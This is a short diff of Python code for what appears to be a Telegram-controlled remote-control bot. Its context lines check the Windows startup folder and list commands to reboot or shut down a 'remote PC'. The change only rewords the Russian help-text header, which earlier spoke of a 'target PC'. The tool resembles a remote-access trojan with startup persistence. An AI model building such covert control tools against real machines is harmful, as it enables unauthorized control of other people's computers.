@@ -19,7 +19,7 @@ if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start
 bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
 
-help_text = """Что можно сделать на целевом ПК:\n
+help_text = """Помощь по командам:\n
 /help - Отправить список всех доступных команд.
 /reboot - Перезагрузить удалённый ПК.
 /shutdown - Выключить удалённый ПК.
